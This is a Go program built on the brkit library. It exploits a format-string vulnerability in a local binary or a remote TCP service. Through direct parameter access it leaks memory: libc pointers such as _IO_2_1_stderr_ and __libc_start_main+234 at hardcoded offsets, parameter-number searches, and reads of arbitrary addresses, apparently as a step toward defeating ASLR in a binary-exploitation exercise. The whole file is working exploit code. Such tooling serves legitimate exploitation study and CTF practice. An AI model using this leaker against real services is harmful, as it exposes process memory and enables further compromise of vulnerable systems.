package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/stephen-fox/brkit/memory"
	"github.com/stephen-fox/brkit/process"
)

func main() {
	verbose := flag.Bool("v", false, "Verbose output")

	flag.Parse()

	var proc *process.Process
	if strings.Contains(flag.Arg(0), ":") {
		proc = process.DialOrExit("tcp", flag.Arg(0))
	} else {
		cmd := exec.Command(flag.Arg(0))
		proc = process.StartOrExit(cmd)
		log.Printf("pid: %d", cmd.Process.Pid)
	}

	if *verbose {
		proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))
	}

	leakParams(proc)
}

func leakParams(proc *process.Process) {
	leaker := memory.NewFormatStringDPALeakerOrExit(memory.FormatStringDPAConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
		//Verbose:      log.New(log.Writer(), log.Prefix(), log.Flags()),
	})

	log.Printf("press enter when ready")
	fmt.Scanln()

	// _IO_2_1_stderr_       - 0x7fefcc8be5c0 - 21
	// __libc_start_main+234 - 0x7fefcc725d0a - 45
	// _IO_file_jumps        - 0x7fefcc8bf4a0 - 28
	_IO_2_1_stderr_ := leaker.MemoryAtParamOrExit(21)
	__libc_start_main234 := leaker.MemoryAtParamOrExit(45)
	_IO_file_jumps := leaker.MemoryAtParamOrExit(28)

	log.Printf("_IO_2_1_stderr_: %s | __libc_start_main+234: %s | _IO_file_jumps %s",
		_IO_2_1_stderr_, __libc_start_main234, _IO_file_jumps)
}

func leakLocalLibcSymbolParamNumbers(proc *process.Process) {
	leaker := memory.NewFormatStringDPALeakerOrExit(memory.FormatStringDPAConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
		//Verbose:      log.New(log.Writer(), log.Prefix(), log.Flags()),
	})

	for {
		log.Printf("please enter a target to find followed by 'enter':\n")
		pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
		if err != nil {
			log.Fatalln(err)
		}
		pointerStr = pointerStr[0:len(pointerStr)-1]

		res, found := leaker.FindParamNumberOrExit([]byte(pointerStr))
		if found {
			log.Printf("format string param number for %s is %d", pointerStr, res)
		} else {
			log.Printf("failed to find '%s'", pointerStr)
		}
	}
}

func leakMemoryAt(proc *process.Process) {
	leaker := memory.SetupFormatStringLeakViaDPAOrExit(memory.FormatStringDPAConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
	})

	log.Printf("please enter a memory address to read from followed by 'enter':\n")
	pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		log.Fatalln(err)
	}

	pointerStr = strings.TrimPrefix(pointerStr[0:len(pointerStr)-1], "0x")
	log.Printf("parsed pointer as '%s'", pointerStr)

	pointer, err := strconv.ParseUint(pointerStr, 16, 64)
	if err != nil {
		log.Fatalln(err)
	}

	raw := leaker.MemoryAtOrExit(memory.PointerMakerForX86().U64(pointer))

	log.Printf("read: 0x%x", raw)
}
